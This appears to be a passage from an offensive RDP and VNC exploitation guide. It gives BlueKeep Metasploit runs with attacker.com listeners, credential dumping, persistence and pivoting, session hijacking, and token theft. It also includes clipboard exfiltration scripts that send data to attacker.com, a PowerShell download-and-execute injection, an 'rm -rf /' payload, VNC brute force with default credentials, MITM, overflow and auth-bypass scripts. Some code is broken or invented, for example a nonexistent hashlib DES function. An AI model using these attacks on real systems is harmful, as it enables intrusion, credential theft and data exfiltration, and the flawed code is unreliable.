Use Metasploit framework for BlueKeep exploitation:

```bash
# Launch msfconsole
msfconsole

# Search for BlueKeep exploits
> search bluekeep

# Use BlueKeep RCE module
> use exploit/windows/rdp/ms19_0708_bluekeep_rce

# Set required options
> set RHOSTS target.com
> set LHOST attacker.com
> set LPORT 4444
> set PAYLOAD windows/meterpreter/reverse_tcp

# Run exploitation
> run
> exploit
```

#### Manual BlueKeep Exploitation

[Unverified] Manual exploitation requires deep understanding of RDP protocol and buffer overflow techniques. This is provided for educational purposes only.

```bash
# BlueKeep exploitation involves:
# 1. Crafted RDP packet triggers buffer overflow
# 2. Payload delivered to vulnerable memory region
# 3. Code execution with RDP service privileges

# Using publicly available PoC exploits
git clone https://github.com/zerosum0x0/bluekeep.git
cd bluekeep

# Compile exploit (requires specific setup)
make

# Run exploit
./bluekeep target.com

# Monitor for successful exploitation
# Look for: shell access, service crash, memory corruption errors
```

#### Post-BlueKeep Exploitation

Actions after successful BlueKeep exploitation:

```bash
# Access obtained through BlueKeep runs as LocalSystem (SYSTEM)
# High-level privileges on compromised system

# Dump credentials from memory
meterpreter> hashdump
meterpreter> run post/windows/gather/hashdump

# Dump system hashes for offline cracking
meterpreter> run post/windows/gather/credentials/credential_collector

# Establish persistence
meterpreter> run persistence -X

# Enumerate network for additional targets
meterpreter> run post/windows/gather/arp_scanner
meterpreter> run post/windows/gather/enum_computers

# Pivot to other systems
meterpreter> portfwd add -l 3389 -p 3389 -r internal-rdp.local
```

### CVE-Specific RDP Vulnerabilities

Multiple RDP vulnerabilities beyond BlueKeep require specific exploitation approaches.

#### CVE-2020-0609: Windows RDP RCE

RDP remote code execution in specific Windows versions:

```bash
# Detection
nmap -p 3389 --script rdp-vuln target.com

# Affected versions: Windows 7 SP1, Server 2008 R2 SP1, and others
# Vulnerability in RDP graphics subsystem

# Metasploit exploitation
msfconsole
> use exploit/windows/rdp/ms_rpc_management
> set RHOSTS target.com
> run

# Manual exploitation (if RDP service configured for exploitation)
# Requires crafted RDP graphics pipeline messages
```

#### CVE-2020-0681: Windows RDP Compression RCE

Vulnerability in RDP bulk data compression:

```bash
# Detection via nmap
nmap -p 3389 --script rdp-enum-encryption target.com

# Affected: Windows 10, Server 2016, Server 2019 (specific versions)

# Exploitation attempts
# Requires enabling RDP compression during connection
mstsc /compression
```

#### CVE-2021-38457: Windows RDP Integer Overflow

Integer overflow in RDP tile encoding:

```bash
# Detection
nmap -p 3389 --script rdp-vuln target.com

# Affected: Multiple Windows versions if unpatched
# Vulnerability in tile encoding logic

# Check for vulnerability indicators
# Vulnerable systems may exhibit unusual RDP behavior
```

#### Vulnerability Scanning Framework

Comprehensive RDP vulnerability detection:

```python
#!/usr/bin/env python3
import nmap
import sys

class RDPVulnerabilityScanner:
    def __init__(self, target):
        self.target = target
        self.nm = nmap.PortScanner()
    
    def scan(self):
        """Scan target for RDP vulnerabilities"""
        print(f"[*] Scanning {self.target} for RDP vulnerabilities")
        
        # Run comprehensive RDP script scan
        self.nm.scan(
            self.target,
            arguments='-p 3389 --script rdp-* -sV'
        )
        
        # Parse results
        for host in self.nm.all_hosts():
            for port in self.nm[host].all_tcp():
                if self.nm[host]['tcp'][port]['state'] == 'open':
                    print(f"\n[+] RDP Service found: {host}:{port}")
                    print(f"    Service: {self.nm[host]['tcp'][port]['name']}")
                    
                    # Check script results for vulnerabilities
                    if 'script' in self.nm[host]['tcp'][port]:
                        for script, output in self.nm[host]['tcp'][port]['script'].items():
                            if 'VULNERABLE' in output or 'vulnerable' in output:
                                print(f"\n[!] VULNERABILITY FOUND: {script}")
                                print(f"    {output[:500]}")

# Usage
if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "target.com"
    scanner = RDPVulnerabilityScanner(target)
    scanner.scan()
```

### Session Hijacking

RDP session hijacking allows attackers to assume control of existing user sessions, providing access without needing credentials.

#### Identifying Active RDP Sessions

Locate and enumerate running RDP sessions:

```bash
# List active RDP sessions (Windows, local system)
qwinsta
query session

# Remote query of RDP sessions (if admin access available)
qwinsta /server:target.local
query session /server:target.local

# Parse output
# Session name: Session ID, User name, State
# console             0  Admin    Active
# rdp-tcp             1  User     Disc

# Monitor for new session creation
Get-PSSession  # PowerShell
get-counter "\Process\Remote Desktop Connection" -Continuous

# Network-level session detection
netstat -an | grep 3389 | grep ESTABLISHED

# SSH/Bash equivalent for remote query (post-compromise)
ssh user@target.local "qwinsta"
```

#### Session Hijacking via tscon

Use tscon to disconnect and assume session:

```bash
# Prerequisites: Administrative access on target system

# List sessions
qwinsta

# Hijack specific session
tscon session_id /dest:console

# Example: Hijack session 2 (User session)
tscon 2 /dest:console

# Automated session hijacking script
#!/bin/bash
# Requires admin access on target

target=$1
for session in $(rdesktop -u admin -p password -d domain $target \
  "qwinsta | awk '/^rdp-tcp/{print \$2}'" | grep -oE '[0-9]+'); do
  
  echo "Hijacking session $session"
  rdesktop -u admin -p password -d domain $target \
    "cmd.exe /c tscon $session /dest:console"
done
```

#### Remote Session Termination and Takeover

Terminate user sessions and assume control:

```bash
# Disconnect specific session
rwinsta session_id /server:target.local

# Kill user session (Windows)
taskkill /s target.local /u admin /p password /PID process_id /t /f

# Force disconnect and reconnect as different user
# On compromised system with admin access

# Script for automated session takeover
python3 << 'EOF'
import subprocess
import sys

def hijack_session(target, admin_user, admin_pass, session_id):
    """Hijack RDP session"""
    
    # Disconnect target session
    cmd1 = f'rwinsta {session_id} /server:{target}'
    
    # Connect as admin to console
    cmd2 = f'tscon {session_id} /dest:console'
    
    try:
        # Execute via admin user
        result = subprocess.run(
            f'runas /u:{admin_user} "{cmd2}"',
            input=admin_pass,
            capture_output=True,
            timeout=10
        )
        print(f"[+] Session hijacking attempt: {result.returncode}")
    except Exception as e:
        print(f"[-] Error: {e}")

# Usage
hijack_session("target.local", "admin", "password", 2)
EOF
```

#### Session Takeover via Shadow Mode

Use RDP shadow mode to observe and control sessions:

```bash
# Shadow mode allows monitoring and control of user sessions
# Requires administrative privileges

# Enable shadow mode (Windows Server)
# Group Policy: Computer Configuration → Administrative Templates →
#               Windows Components → Remote Desktop Services → Session

# Command-line shadow connection
mstsc /admin /shadow:session_id /noconsentprompt

# Automated shadow takeover
msg * "Your session is being monitored"
shadow session_id

# PowerShell-based session control
Get-RDUserSession -ConnectionBroker target.local | 
  Where-Object {$_.UserName -eq "targetuser"} |
  Send-RDUserMessage -MessageTitle "Alert" -MessageBody "Session Hijacked"
```

#### Token Stealing for Session Hijacking

Steal authentication tokens to access existing sessions:

```bash
# Capture authentication tokens (Windows)
# Requires admin access or memory access

# Using mimikatz (post-exploitation tool)
mimikatz.exe "token::elevate" "token::revert" "exit"

# Extract and reuse tokens
mimikatz.exe "sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:hash /run:powershell"

# Reverse engineered token stealing
python3 << 'EOF'
import ctypes
import sys

# Windows token manipulation requires low-level access
# Typically done via kernel exploitation or admin access

class TokenStealer:
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
    
    def get_token(self, pid):
        """Attempt to retrieve process token"""
        handle = self.kernel32.OpenProcess(
            0x0400,  # PROCESS_QUERY_INFORMATION
            False,
            pid
        )
        if handle:
            token = ctypes.c_void_p()
            result = self.kernel32.OpenProcessToken(handle, 0xF01FF, ctypes.byref(token))
            if result:
                print(f"[+] Token obtained for PID {pid}")
                return token
        return None

# Usage requires admin privileges
# stealer = TokenStealer()
# token = stealer.get_token(pid)
EOF
```

### Clipboard Data Theft

RDP clipboard redirection allows copying/pasting between local and remote systems. Compromised systems can exfiltrate sensitive clipboard data.

#### Clipboard Redirection Analysis

Understand RDP clipboard functionality:

```bash
# Enable clipboard redirection in RDP connection
mstsc /v:target.com +clipboard

# Clipboard data flows through RDP channel 7 (cliprdr)
# Monitor clipboard activity
tcpdump -i any -A 'tcp port 3389' | grep -i "clip\|clip"

# Analyze RDP traffic for clipboard data
tcpdump -i any -w clipboard.pcap 'tcp port 3389'
wireshark clipboard.pcap  # Filter for cliprdr channel
```

#### Clipboard Monitoring and Exfiltration

Extract sensitive data from clipboard during RDP sessions:

```bash
# Monitor local clipboard while connected via RDP
# Clipboard contents captured from RDP channel

# PowerShell script to monitor clipboard on target
powershell << 'EOF'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

while ($true) {
    $clipboard = [System.Windows.Forms.Clipboard]::GetText()
    if ($clipboard) {
        Write-Host "Clipboard: $clipboard"
        # Exfiltrate via network
        Invoke-WebRequest -Uri "http://attacker.com/log?data=$clipboard" -Method GET
    }
    Start-Sleep -Seconds 1
}
EOF

# Linux-based clipboard monitoring during RDP session
while true; do
  current=$(xclip -selection clipboard -o 2>/dev/null)
  if [ -n "$current" ]; then
    echo "Clipboard: $current" >> /tmp/clipboard_log.txt
    # Send to attacker server
    curl "http://attacker.com/log?data=$(urlencode $current)" 2>/dev/null
  fi
  sleep 1
done

# Capture clipboard via network interception
tcpdump -i any -A 'tcp port 3389' | grep -oP '(?<=CLIP\x00)[^\x00]+' > clipboard_data.txt
```

#### RDP Clipboard Redirection Malware

Malware exploiting clipboard redirection for data theft:

```cpp
// C++ code to intercept RDP clipboard
// [Unverified] This is a simplified demonstration
#include <windows.h>
#include <stdio.h>

void MonitorClipboard() {
    if (OpenClipboard(NULL)) {
        HANDLE hData = GetClipboardData(CF_TEXT);
        if (hData) {
            char* pszText = (char*)GlobalLock(hData);
            if (pszText) {
                printf("Clipboard: %s\n", pszText);
                // Exfiltrate data
                // SendToAttacker(pszText);
                GlobalUnlock(hData);
            }
        }
        CloseClipboard(); } }

int main() { while (true) { MonitorClipboard(); Sleep(1000); } return 0; }

````

#### Clipboard Injection Attacks

Inject malicious content into clipboard:

```bash
# Inject commands into clipboard during RDP session
# Target user copies clipboard content, executing injected commands

# PowerShell clipboard injection
powershell << 'EOF'
# Inject command into clipboard
$command = "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload')"
[System.Windows.Forms.Clipboard]::SetText($command)
EOF

# Inject via clipboard during connection
echo "injected_data" | xclip -selection clipboard

# Monitor for paste operations and inject malicious content
python3 << 'EOF'
import subprocess
import time

def inject_clipboard(payload):
    """Inject content into system clipboard"""
    process = subprocess.Popen(
        ['xclip', '-selection', 'clipboard'],
        stdin=subprocess.PIPE
    )
    process.communicate(input=payload.encode())

# Payload injection chain
payloads = [
    "calc.exe",
    "cmd.exe /c whoami",
    "; rm -rf /",
]

for payload in payloads:
    inject_clipboard(payload)
    time.sleep(5)
EOF

# Detect clipboard injection attempts
# Monitor for unexpected clipboard modifications
# Alert on suspicious command injection patterns
````

#### Clipboard Data Format Attacks

Exploit specific clipboard data formats for exploitation:

```bash
# RDP clipboard supports multiple formats:
# CF_TEXT, CF_UNICODETEXT, CF_HTML, CF_IMAGE, CF_FILES

# Inject HTML with embedded scripts
cat > /tmp/malicious.html << 'EOF'
<html>
<head><script>
alert('XSS in clipboard');
// If pasted into vulnerable application
</script></head>
<body>Click me</body>
</html>
EOF

# Copy to clipboard
xclip -i -t text/html < /tmp/malicious.html

# File format exploitation
# Inject path traversal in file clipboard format
echo "../../../../etc/passwd" | xclip -selection clipboard

# Image-based attacks
# Embed data in image metadata
exiftool -Comment="malicious_data" image.jpg
xclip -i -t image/jpeg < image.jpg
```

#### Clipboard Exfiltration Detection and Prevention

Identify and block clipboard data theft:

```bash
# Monitor RDP clipboard traffic
tcpdump -i any -A 'tcp port 3389' -w rdp_clipboard.pcap

# Analyze for sensitive data patterns
# Credit cards, SSNs, passwords, etc.

# Regular expression pattern matching
cat rdp_clipboard.pcap | strings | grep -E \
  '^[0-9]{4}-?[0-9]{4}-?[0-9]{4}-?[0-9]{4}$|' \  # Credit card
  '^[0-9]{3}-[0-9]{2}-[0-9]{4}$|' \               # SSN
  'password|secret|key|token'                     # Sensitive keywords

# Windows Group Policy to disable clipboard redirection
# Computer Configuration → Administrative Templates →
# Windows Components → Remote Desktop Services → Session →
# Devices and Resource Redirection → Do not allow clipboard redirection

# PowerShell to disable clipboard
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows NT\Terminal Services" `
  -Name "fDisableClip" -Value 1

# Audit clipboard access
auditctl -w /proc/kcore -p r -k clipboard_access

# Monitor for clipboard exfiltration patterns
# High-volume clipboard operations to network
netstat -an | grep -E "3389|5985|5986"
```

#### Advanced Clipboard Exploitation

Complex clipboard-based attacks:

```python
#!/usr/bin/env python3
import subprocess
import time
import threading
import urllib.request

class ClipboardExfiltrator:
    def __init__(self, exfil_url):
        self.exfil_url = exfil_url
        self.running = True
        self.last_clipboard = ""
    
    def get_clipboard(self):
        """Retrieve current clipboard content"""
        try:
            process = subprocess.run(
                ['xclip', '-selection', 'clipboard', '-o'],
                capture_output=True,
                timeout=5
            )
            return process.stdout.decode().strip()
        except:
            return ""
    
    def exfiltrate_data(self, data):
        """Send clipboard data to attacker server"""
        if len(data) < 5:  # Ignore minimal clipboard
            return
        
        try:
            # Encode and send
            import urllib.parse
            encoded = urllib.parse.quote(data)
            url = f"{self.exfil_url}?clipboard={encoded}"
            urllib.request.urlopen(url, timeout=5)
            print(f"[+] Exfiltrated: {data[:50]}...")
        except Exception as e:
            print(f"[-] Exfiltration failed: {e}")
    
    def monitor(self):
        """Continuous clipboard monitoring"""
        while self.running:
            current = self.get_clipboard()
            if current and current != self.last_clipboard:
                self.last_clipboard = current
                self.exfiltrate_data(current)
            time.sleep(2)
    
    def start(self):
        """Start monitoring in background thread"""
        thread = threading.Thread(target=self.monitor, daemon=True)
        thread.start()
        return thread
    
    def stop(self):
        """Stop monitoring"""
        self.running = False

# Usage (requires network access from target to attacker)
# exfiltrator = ClipboardExfiltrator("http://attacker.com/exfil")
# exfiltrator.start()
```

#### RDP Clipboard Forensics

Analyze clipboard usage and data for forensic investigation:

```bash
# Retrieve clipboard history (limited, typically last item only)
# Windows: No built-in clipboard history in older versions
# Windows 10/11: Clipboard history available
Get-Clipboard -Format Text
Get-Clipboard -Format FileDropList

# Export clipboard data for analysis
Export-Clipboard -Format Text -Path clipboard_export.txt

# Analyze RDP session logs for clipboard activity
Get-EventLog -LogName System -Source TerminalServices-RemoteConnectionManager | 
  Select-Object -Property TimeGenerated, Message | Export-Csv rdp_logs.csv

# Parse RDP traffic for clipboard data
tcpdump -i any -A 'tcp port 3389' | 
  grep -oP '(?<=CLIPRDR)[^\x00]+' | strings > clipboard_artifacts.txt

# Detect clipboard-based attacks in logs
grep -E "clip|Copy|Paste|Ctrl\+C|Ctrl\+V" /var/log/auth.log /var/log/audit.log

# Monitor for suspicious clipboard operations
auditctl -w /tmp -p wa -k clipboard_watch
ausearch -k clipboard_watch
```

#### Clipboard Data Recovery

Recover deleted or overwritten clipboard content:

```bash
# Clipboard data in memory
# If system not restarted, may recover from RAM

# Dump system memory
dd if=/dev/mem of=memory_dump.bin

# Search memory dump for clipboard content
strings memory_dump.bin | grep -E "password|secret|credit"

# Swap file analysis (if clipboard data swapped to disk)
strings /var/swap | grep -E "sensitive_pattern"

# Temporary file analysis
find /tmp -type f -mmin -60 | xargs strings | grep -E "clipboard_pattern"

# Windows pagefile analysis
# Analyze C:\pagefile.sys for clipboard remnants
# Requires forensic tools like EnCase or FTK
```

This comprehensive RDP exploitation guide covers brute force attacks, credential relaying, critical vulnerabilities like BlueKeep, session hijacking, and clipboard-based data theft. Each technique includes practical implementation examples, detection methods, and forensic analysis approaches applicable to security testing and incident response scenarios.

---

## VNC Exploitation

### VNC Brute Force

VNC (Virtual Network Computing) allows remote desktop access without rate limiting or account lockout mechanisms in default configurations, making brute force attacks highly effective.

#### VNC Service Identification

Identify VNC services on target systems:

```bash
# Standard VNC port
nmap -p 5900 target.com
nmap -p 5900-5910 target.com  # Multiple VNC instances

# Alternative VNC ports
nmap -p 5800-5810 target.com  # VNC web interface
nmap -p 5500,5501,5902,5903 target.com

# Service detection
nmap -sV -p 5900 target.com
# Output: 5900/tcp open  vnc

# Using banner grabbing
nc -v target.com 5900
# Expected response: RFB 003.008 (or similar RFB version)

# curl alternative (if HTTP interface available)
curl -v http://target.com:5800/
# Java VNC applet or web portal often present
```

#### Banner Grabbing and Version Detection

```bash
# Connect to VNC port
telnet target.com 5900

# VNC responds with RFB (Remote FrameBuffer) protocol version
# RFB 003.008
# RFB 003.007
# RFB 003.003

# Research known vulnerabilities for specific versions
# Older versions more likely vulnerable

# Using Nmap NSE scripts for detailed detection
nmap -p 5900 --script vnc-info target.com
# Displays: RFB protocol version, width/height, server name
```

#### Credential Brute Force Tools

**Using Hydra:**

```bash
# Basic VNC brute force
hydra -L usernames.txt -P passwords.txt vnc://target.com

# With specific port
hydra -L usernames.txt -P passwords.txt -s 5900 vnc://target.com

# Verbose output showing attempts
hydra -L usernames.txt -P passwords.txt -s 5900 vnc://target.com -v

# Single user brute force
hydra -l admin -P passwords.txt vnc://target.com

# Output format:
# [5900][vnc] host: target.com password: password123
```

**Using metasploit:**

```bash
# Launch msfconsole
msfconsole

# Use VNC auxiliary module
use auxiliary/scanner/vnc/vnc_login
set RHOSTS target.com
set USER_FILE /path/to/usernames.txt
set PASS_FILE /path/to/passwords.txt
set RPORT 5900
run

# Results display valid credentials discovered
```

**Using patator (parallel brute force):**

```bash
# Patator VNC module
patator vnc_login host=target.com user=FILE(usernames.txt) password=FILE(passwords.txt) -x ignore:fgrep='Authentication failed'

# Faster parallel execution compared to sequential tools
# Custom error handling for VNC-specific responses
```

#### VNC Protocol Response Analysis

VNC authentication responses reveal information:

```bash
# Successful authentication
220 (indicating successful RFB handshake)

# Authentication failure messages
221 (authentication failed)
222 (too many authentication failures)

# [Inference] Response time analysis
# Successful credentials: typically faster response
# Invalid credentials: slower response (processing attempt)
# Use response times to optimize wordlist ordering
```

#### Common VNC Credentials

**Default VNC passwords:**

```
Default VNC installations:
- Password: (empty/blank)
- Password: vnc
- Password: password
- Password: 12345
- Password: admin

Operating system specific:
Linux:
- User: root, Password: (system password)
- User: vncuser, Password: vncuser

Windows:
- User: Administrator, Password: (system password)

Mac:
- User: admin, Password: (system password)

Embedded systems/devices:
- User: root, Password: root
- User: admin, Password: admin
- User: root, Password: (empty)
```

**Device-specific defaults:**

```
Cisco router VNC:
- Password: (device enable password)

HP iLO remote access:
- User: Administrator, Password: (not set)

Dell iDRAC:
- User: root, Password: calvin (older versions)

Avocent KVM switches:
- User: root, Password: avocent
```

#### Optimized Brute Force Strategy

```bash
# Stage 1: Test empty password
hydra -l admin -p "" vnc://target.com -t 1

# Stage 2: Test common passwords (high probability)
hydra -l admin -P common-passwords.txt vnc://target.com -t 4

# Stage 3: Test default credentials by account type
# admin:admin, root:password, guest:guest

# Stage 4: Full wordlist if previous stages fail
hydra -l admin -P full-wordlist.txt vnc://target.com -t 4
```

#### Post-Brute Force Access

Once valid credentials obtained:

```bash
# Connect using discovered password
vncviewer target.com:5900

# Enter password when prompted
# Connected to remote desktop

# Or using remmina (GUI VNC client)
remmina -c vnc://admin:password@target.com:5900

# Using xvncviewer
xvncviewer target.com:5900

# Command-line arguments
# -passwd file - specify password file
# -autopass - read password from stdin
```

#### VNC Session Hijacking

```bash
# If VNC traffic unencrypted, capture session

# Tcpdump capture
tcpdump -i eth0 port 5900 -A

# Wireshark analysis
# Follow TCP stream to view VNC protocol exchanges
# Extract mouse movements, keystrokes, screen updates

# Convert captured stream to video for playback
```

### VNC Weak Encryption

VNC uses weak or no encryption by default, allowing interception of credentials and session data.

#### VNC Encryption Methods

**None/No Encryption:**

```bash
# VNC protocol RFB version 3.3 and earlier
# No encryption of data after authentication

# Credentials sent over network (if not using tunneling)
# Screen content visible in plaintext
# Keystrokes intercepted

# Detection via protocol version
nmap -p 5900 --script vnc-info target.com
# If RFB 003.003: likely no encryption
```

**VNC DES Encryption:**

```bash
# Weak DES encryption (56-bit key)
# Cryptographically broken

# Decryption feasible with modern computing
# Tools available to decrypt captured VNC sessions

# DES key derivation from password
# Password → 56-bit key → DES encryption

# Capture encrypted traffic
tcpdump -i eth0 port 5900 -w vnc_traffic.pcap

# DES can be brute forced offline after capture
```

**VNC Challenge-Response:**

```bash
# VNC Challenge-Response authentication
# Server sends 16-byte challenge
# Client encrypts with DES using password-derived key
# Server verifies response

# Vulnerable to offline attack
# Capture challenge + response
# Brute force password offline

# Tools: chntpw, vncpass, or custom scripts
# Test each password candidate against captured challenge/response
```

#### Man-in-the-Middle Attack Setup

```bash
# Intercept VNC traffic

# ARP spoofing to redirect traffic
arpspoof -i eth0 -t target.com gateway.com

# OR redirect routing
iptables -t nat -A PREROUTING -p tcp --dport 5900 -j REDIRECT --to-port 5900

# Capture traffic with tcpdump
tcpdump -i eth0 port 5900 -w vnc_capture.pcap

# Analyze in Wireshark
wireshark vnc_capture.pcap

# Extract RFB protocol frames
# Identify authentication data, encryption parameters, session content
```

#### VNC Authentication Data Extraction

```bash
# From captured VNC handshake, extract:
# 1. RFB version negotiation
# 2. Security types offered
# 3. Challenge value (if DES used)
# 4. Response value (encrypted password)

# Use tshark to extract automatically
tshark -r vnc_capture.pcap -Y "vnc" -T fields -e vnc.challenge -e vnc.response

# Offline password brute force
python3 << 'EOF'
import hashlib
import des

challenge = bytes.fromhex("<challenge_from_capture>")
response = bytes.fromhex("<response_from_capture>")

wordlist = ["password", "admin", "12345"]

for password in wordlist:
    # VNC DES key derivation
    key = hashlib.des_crypt(password)[:8]
    
    # Encrypt challenge
    cipher = des.new(key, des.MODE_ECB)
    encrypted = cipher.encrypt(challenge)
    
    if encrypted == response:
        print(f"Password found: {password}")
        break
EOF
```

#### [Unverified] SSL/TLS Downgrade Attacks

Some VNC implementations negotiate encryption:

```bash
# Server offers TLS option
# Attacker forces downgrade to no encryption

# SSL/TLS stripping
# Intercept negotiation
# Remove TLS from supported options
# Client falls back to unencrypted connection

# Requires MITM position
# tcpdump capture + modification + replay
```

#### VNC Traffic Analysis

```bash
# Wireshark dissector for VNC protocol
# Follow VNC stream in Wireshark
# Analyze FramebufferUpdate messages for:
# - Screen content
# - Cursor position
# - Key events (determine keystrokes)

# Export VNC session
tshark -r vnc_capture.pcap -Y vnc -T ek > vnc_export.json

# Parse JSON to reconstruct session
python3 << 'EOF'
import json

with open('vnc_export.json') as f:
    data = json.load(f)
    
for packet in data['packets']:
    if 'vnc' in packet:
        print(packet['vnc'])
EOF
```

#### Remediation Verification

Verify if VNC uses proper encryption:

```bash
# Connect and check encryption status
vncviewer -info target.com:5900
# Should show: "Using TLS encryption"
# Or: "Using SSH tunnel"

# Check VNC configuration
cat /etc/tigervnc/vncserver.conf
cat ~/.vnc/config

# Look for:
# SecurityTypes=TLSNone,TLSVnc,TLSPlain
# SecurityTypes=X509Vnc
# Use encryption settings
```

### VNC Buffer Overflows

VNC implementations contain memory vulnerabilities that allow code execution through malformed protocol data.

#### Known VNC Vulnerabilities

**TightVNC buffer overflow (CVE-2009-0159):**

```bash
# Vulnerable versions: TightVNC 1.3.x
# Buffer overflow in protocol handler

# Affects: Decoder for ClientCutText message
# Malformed message with oversized clipboard data causes overflow

# Detection
nmap -p 5900 --script vnc-info target.com
# If TightVNC 1.3.x identified, likely vulnerable
```

**RealVNC buffer overflow (CVE-2005-3269):**

```bash
# Vulnerable versions: RealVNC 4.0
# Heap overflow in ZLIB decompression

# Affects: FramebufferUpdate handling
# Compressed framebuffer data causes heap corruption
```

**LibVNCServer vulnerabilities:**

```bash
# CVE-2014-6051: Insufficient input validation
# CVE-2015-9262: Stack buffer overflow
# CVE-2018-7225: Integer overflow

# Multiple versions affected across many VNC implementations
```

#### Exploit Development

**Using metasploit for known exploits:**

```bash
# Search for VNC exploits
msfconsole
search vnc overflow
search type:exploit vnc

# Use discovered exploit module
use exploit/windows/vnc/realvnc_client_overflow
set RHOST target.com
set RPORT 5900
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST attacker.com
set LPORT 4444
run

# If successful, meterpreter session established
```

**Manual exploit crafting:**

```bash
# Identify vulnerable VNC server software
vncserver --version
# TightVNC version 1.3.10

# Analyze RFB protocol for vulnerable code paths
# Craft malformed RFB message to trigger overflow

# Example: ClientCutText overflow
# RFB format: message_type(1) + padding(3) + length(4) + data(variable)

# Create oversized ClientCutText
python3 << 'EOF'
import socket
import struct

def create_overflow_payload():
    # RFB message type 6 = ClientCutText
    message_type = struct.pack('!B', 6)
    padding = struct.pack('!BBB', 0, 0, 0)
    
    # Oversized clipboard data (trigger buffer overflow)
    overflow_size = 100000
    overflow_data = b'A' * overflow_size
    
    length = struct.pack('!I', overflow_size)
    
    return message_type + padding + length + overflow_data

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('target.com', 5900))

# Read RFB version
version = sock.recv(12)
print(f"VNC Version: {version}")

# Send version
sock.send(b'RFB 003.008\n')

# Receive security types
security_types = sock.recv(1024)

# Send overflow payload
payload = create_overflow_payload()
sock.send(payload)

sock.recv(1024)  # Receive response
EOF
```

#### Exploit Delivery Mechanisms

**Via malicious VNC client:**

```bash
# Create fake VNC server that sends exploit
# Trick target into connecting to attacker-controlled VNC

# Attacker VNC server: Accept connection
nc -l -p 5900

# Send malicious RFB frames
# Include buffer overflow payload in FramebufferUpdate

# When legitimate VNC client connects and processes frame
# Overflow triggered, code execution achieved
```

**Via proxy injection:**

```bash
# MITM attack: Intercept legitimate VNC connection
# Inject malicious RFB data into stream

# arpspoof to intercept traffic
arpspoof -i eth0 -t target.com gateway.com

# Modify RFB stream in real-time
# Insert buffer overflow payload
# Execute code on target during legitimate VNC session
```

#### Post-Exploitation

After successful exploit:

```bash
# Meterpreter session (if using metasploit)
meterpreter> sysinfo
meterpreter> getuid
meterpreter> shell
meterpreter> migrate -N explorer.exe

# In shell context, VNC process compromised
# Execute commands with VNC service privileges
```

#### [Unverified] Heap Exploitation Techniques

```bash
# For heap-based overflows (like RealVNC CVE-2005-3269)

# Exploit requires:
# 1. Trigger heap allocation pattern
# 2. Overflow heap metadata
# 3. Corrupt adjacent heap chunks
# 4. Achieve arbitrary write primitive
# 5. Overwrite function pointers or vtables
# 6. Redirect execution to shellcode

# Heap spray to increase reliability
# Allocate many chunks to control heap layout
# Increase probability of overflow reaching exploitable chunk
```

### VNC Authentication Bypass

VNC has multiple authentication mechanisms, many with bypass vulnerabilities.

#### Authentication Methods

**No Authentication (None):**

```bash
# RFB 003.003 supports no authentication
# Client connects directly without credentials

# Detection
vncviewer -info target.com:5900
# If no password prompt, likely no authentication

# Or protocol analysis
# Security type = 1 (None)
# Skip authentication phase
```

**VNC Authentication (DES-based):**

```bash
# Most common VNC authentication
# Server sends 16-byte challenge
# Client encrypts with password-derived DES key
# Server verifies response

# Vulnerabilities:
# - Weak DES encryption
# - No salt (deterministic)
# - No rate limiting
# - Rainbow tables feasible
```

**[Unverified] Unix Login (PAM/System Authentication):**

```bash
# Unix system authentication passed to VNC
# Credentials forwarded to system PAM

# Often bypassed if system has weak auth
# Or if VNC service runs as root (allows privilege bypass)
```

#### Trivial Authentication Bypass

**Empty password bypass:**

```bash
# Some VNC installations accept empty password

vncviewer target.com:5900
# When prompted for password, press Enter
# If connection succeeds, authentication bypassed

# Automated test
echo "" | vncviewer target.com:5900

# Hydra test for empty password
hydra -l admin -p "" vnc://target.com
```

**Default password bypass:**

```bash
# VNC installations with default passwords unchanged

# Common defaults
vncviewer target.com:5900
# Password: vnc
# Password: password
# Password: admin

# Test multiple accounts
for pass in "" "vnc" "password" "admin" "12345"; do
  echo "Testing password: $pass"
  (echo "$pass"; sleep 1) | vncviewer target.com:5900
done
```

**Unauthenticated access on specific RFB versions:**

```bash
# RFB 003.003 protocol flaw
# No challenge-response validation in some implementations

# Client can bypass authentication entirely
python3 << 'EOF'
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('target.com', 5900))

# Receive RFB version
version = sock.recv(12)
print(f"Server: {version}")

# Send supported version
sock.send(b'RFB 003.003\n')

# Receive security type
sec_type = sock.recv(1)
print(f"Security type: {sec_type}")

# In some implementations, can proceed without authentication
# Send ClientInit directly
client_init = b'\x01\x00'  # 1 byte + 3 padding
sock.send(client_init)

# Receive ServerInit (framebuffer dimensions, etc.)
response = sock.recv(1024)
print(f"Connected! Response: {response[:20]}")
EOF
```

#### Challenge-Response Compromise

**Challenge predictability:**

```bash
# If VNC server generates predictable challenges
# Attacker can pre-compute responses

# Some implementations use weak RNG
# Challenge derived from timestamp or seed

python3 << 'EOF'
import time
import des

# Predict challenge from timestamp
timestamp = int(time.time())
challenge = str(timestamp).encode().ljust(16, b'\x00')[:16]

# If password known, compute expected response
password = "vnc"
key = des.des(password.encode().ljust(8, b'\x00'))
response = key.encrypt(challenge)

print(f"Predicted challenge: {challenge.hex()}")
print(f"Computed response: {response.hex()}")
EOF
```

#### Protocol Downgrade Attack

**Force unencrypted authentication:**

```bash
# VNC server offers multiple security types
# SecurityTypes: [5=RA2, 19=Tight, 16=SASL, 1=None]

# MITM attacker removes strong options
# Client forced to negotiate weaker auth

# Intercepted negotiation
# Remove encryption options
# Client accepts None authentication

# Requires MITM position
# tcpdump capture + modify + replay
```

#### Authentication Bypass via Buffer Overflow

```bash
# Exploit buffer overflow in authentication handler
# Skip credential verification

# Example: Stack-based overflow
# Overwrite authentication flag on stack
# Set is_authenticated = true

# Requires knowledge of:
# - Stack layout
# - Authentication variable location
# - Overflow buffer size
```

#### SSH Tunnel Bypass

Some VNC implementations support SSH tunneling:

```bash
# Intended: SSH tunnels VNC connection
# ssh -L 5900:localhost:5900 user@target.com

# Bypass:
# Connect directly to port 5900 (if exposed)
# Skip SSH requirement

nmap -p 5900 target.com
# If open, direct VNC connection possible without SSH

# Or exploit SSH key reuse
# If SSH private key compromised, use for VNC via tunnel
```

